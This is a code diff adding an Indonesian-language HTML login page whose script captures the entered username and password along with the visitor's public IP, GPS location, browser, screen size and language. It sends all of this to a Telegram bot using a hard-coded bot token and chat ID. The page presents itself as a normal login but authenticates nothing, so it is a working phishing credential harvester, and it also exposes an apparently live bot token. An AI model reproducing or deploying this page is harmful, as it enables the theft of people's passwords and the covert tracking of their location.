@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Form Login Kirim Telegram</title>
+  <meta charset="UTF-8">
+  <style>
+    body { font-family: Arial; padding: 30px; }
+    input { display: block; margin: 10px 0; padding: 8px; width: 100%; max-width: 300px; }
+    button { padding: 10px 20px; }
+  </style>
+</head>
+<body>
+
+  <h2>Login</h2>
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Username" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button type="submit">Login</button>
+  </form>
+
+  <script>
+    const TOKEN = '7707166709:AAHfwZ_lWHqVtYROADuojWlNRt-b-IN-gJE';
+    const CHAT_ID = '7233342888';
+
+    document.getElementById('loginForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const userAgent = navigator.userAgent;
+      const screenSize = `${screen.width}x${screen.height}`;
+      const browserLang = navigator.language || navigator.userLanguage;
+      const waktu = new Date().toLocaleString();
+      const browserVersion = userAgent.match(/(Chrome|Firefox|Safari)\/[\d.]+/)?.[0] || "Tidak diketahui";
+
+      // Ambil IP publik
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+
+      // Ambil lokasi
+      navigator.geolocation.getCurrentPosition(async function (position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        const message = `
+🔐 Percobaan Login
+👤 Username: ${username}
+🔑 Password: ${password}
+🕒 Waktu: ${waktu}
+🌐 IP: ${ip}
+📍 Lokasi: https://maps.google.com/?q=${lat},${lon}
+📱 Perangkat: ${userAgent}
+🧭 Browser: ${browserVersion}
+📐 Layar: ${screenSize}
+🌍 Bahasa: ${browserLang}
+        `;
+
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+
+        alert("Data dikirim!");
+      }, function (error) {
+        alert("Gagal ambil lokasi: " + error.message);
+      });
+
+    });
+  </script>
+
+</body>
+</html>
